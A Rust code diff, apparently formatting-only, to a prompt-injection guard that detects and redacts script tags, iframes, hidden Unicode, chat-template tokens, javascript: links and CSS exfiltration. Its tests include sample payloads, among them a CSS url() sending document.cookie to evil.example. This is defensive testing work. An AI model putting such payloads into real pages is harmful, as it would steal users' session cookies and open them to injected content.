@@ -191,7 +191,10 @@ pub trait PromptInjectionGuard: Send + Sync {
     ///
     /// Returns [`PromptInjectionError::Sanitise`] if the guard fails
     /// to apply its rules.
-    async fn scan(&self, input: UntrustedText) -> Result<Vec<InjectionFinding>, PromptInjectionError>;
+    async fn scan(
+        &self,
+        input: UntrustedText,
+    ) -> Result<Vec<InjectionFinding>, PromptInjectionError>;
 
     /// Sanitise [`UntrustedText`] by applying the guard's rules.
     ///
@@ -335,12 +338,12 @@ impl DefaultPromptInjectionGuard {
             while let Some(rel_idx) = lower[search_from..].find(&phrase_lower) {
                 let absolute = search_from + rel_idx;
                 let end = absolute + phrase_lower.len();
-                let severity = if phrase_lower.contains("im_start") || phrase_lower.contains("endoftext")
-                {
-                    Severity::Error
-                } else {
-                    Severity::Warning
-                };
+                let severity =
+                    if phrase_lower.contains("im_start") || phrase_lower.contains("endoftext") {
+                        Severity::Error
+                    } else {
+                        Severity::Warning
+                    };
                 findings.push(InjectionFinding {
                     location: absolute..end,
                     marker: InjectionMarker::KnownInjectionPhrase,
@@ -486,12 +489,12 @@ impl DefaultPromptInjectionGuard {
             while let Some(rel_idx) = lower[search_from..].find(&phrase_lower) {
                 let absolute = search_from + rel_idx;
                 let end = absolute + phrase_lower.len();
-                let severity = if phrase_lower.contains("im_start") || phrase_lower.contains("endoftext")
-                {
-                    Severity::Error
-                } else {
-                    Severity::Warning
-                };
+                let severity =
+                    if phrase_lower.contains("im_start") || phrase_lower.contains("endoftext") {
+                        Severity::Error
+                    } else {
+                        Severity::Warning
+                    };
                 ranges.push((absolute, end, (*phrase).to_string(), severity));
                 search_from = end;
             }
@@ -507,12 +510,7 @@ impl DefaultPromptInjectionGuard {
                 severity,
                 reason: format!("known injection phrase: {phrase:?}"),
             });
-            *input = format!(
-                "{}[REDACTED:{}]{}",
-                &input[..start],
-                phrase,
-                &input[end..]
-            );
+            *input = format!("{}[REDACTED:{}]{}", &input[..start], phrase, &input[end..]);
             // We don't actually need `original`; suppress unused.
             let _ = original;
         }
@@ -554,7 +552,10 @@ impl PromptInjectionGuard for DefaultPromptInjectionGuard {
         "default"
     }
 
-    async fn scan(&self, input: UntrustedText) -> Result<Vec<InjectionFinding>, PromptInjectionError> {
+    async fn scan(
+        &self,
+        input: UntrustedText,
+    ) -> Result<Vec<InjectionFinding>, PromptInjectionError> {
         Ok(Self::scan_sync(&input.0))
     }
 
@@ -589,15 +590,24 @@ mod tests {
         let (out, findings) = guard().sanitise(input).await.unwrap();
         assert!(!out.as_str().contains("<script"));
         assert!(!out.as_str().contains("alert"));
-        assert!(findings.iter().any(|f| f.marker == InjectionMarker::ScriptTag));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.marker == InjectionMarker::ScriptTag)
+        );
     }
 
     #[tokio::test]
     async fn strips_iframe_blocks() {
-        let input: UntrustedText = "before<iframe src=\"https://evil.example\"></iframe>after".into();
+        let input: UntrustedText =
+            "before<iframe src=\"https://evil.example\"></iframe>after".into();
         let (out, findings) = guard().sanitise(input).await.unwrap();
         assert!(!out.as_str().contains("<iframe"));
-        assert!(findings.iter().any(|f| f.marker == InjectionMarker::IframeInjection));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.marker == InjectionMarker::IframeInjection)
+        );
     }
 
     #[tokio::test]
@@ -605,7 +615,11 @@ mod tests {
         let input: UntrustedText = "Hello\u{200B}\u{200B}world".to_string().into();
         let (out, findings) = guard().sanitise(input).await.unwrap();
         assert_eq!(out.as_str(), "Helloworld");
-        assert!(findings.iter().any(|f| f.marker == InjectionMarker::HiddenUnicode));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.marker == InjectionMarker::HiddenUnicode)
+        );
     }
 
     #[tokio::test]
@@ -632,7 +646,11 @@ mod tests {
         let input: UntrustedText = "[click here](javascript:alert(1))".into();
         let (out, findings) = guard().sanitise(input).await.unwrap();
         assert!(out.as_str().contains("[REDACTED:JS_LINK]"));
-        assert!(findings.iter().any(|f| f.marker == InjectionMarker::MarkdownLinkTrap));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.marker == InjectionMarker::MarkdownLinkTrap)
+        );
     }
 
     #[tokio::test]
@@ -641,7 +659,11 @@ mod tests {
             "background: url('https://evil.example/x?cookie='+document.cookie)".into();
         let (out, findings) = guard().sanitise(input).await.unwrap();
         assert!(out.as_str().contains("[REDACTED:CSS_URL]"));
-        assert!(findings.iter().any(|f| f.marker == InjectionMarker::CssExfil));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.marker == InjectionMarker::CssExfil)
+        );
     }
 
     #[tokio::test]
@@ -657,7 +679,11 @@ mod tests {
         let original = "Hello <script>x</script> world";
         let input: UntrustedText = original.to_string().into();
         let findings = guard().scan(input.clone()).await.unwrap();
-        assert!(findings.iter().any(|f| f.marker == InjectionMarker::ScriptTag));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.marker == InjectionMarker::ScriptTag)
+        );
         // scan() must not mutate the input.
         assert_eq!(input.as_str(), original);
     }
